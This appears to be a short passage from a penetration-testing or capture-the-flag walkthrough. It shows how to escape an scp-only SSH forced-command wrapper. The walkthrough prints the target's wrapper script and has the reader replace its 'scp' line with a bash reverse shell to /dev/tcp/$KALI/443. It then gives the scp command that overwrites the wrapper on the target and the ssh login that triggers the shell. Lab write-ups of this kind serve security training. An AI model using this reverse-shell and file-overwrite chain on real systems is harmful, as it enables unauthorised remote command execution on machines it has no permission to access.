#### Overwrite files on target (sshd_config)

Source code retrieved from target:

```
#!/bin/bash

case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

Notice "scp" is just a system command, so let's replace that line with a reverse shell:

```bash - kali
bash -i >& /dev/tcp/$KALI/443 0>&1
```

```bash - kali
scp -i id_rsa ../scp_wrapper.sh $USER@$TARGET:/home/$USER
```

```bash - kali
ssh -i id_rsa $USER@$TARGET
```
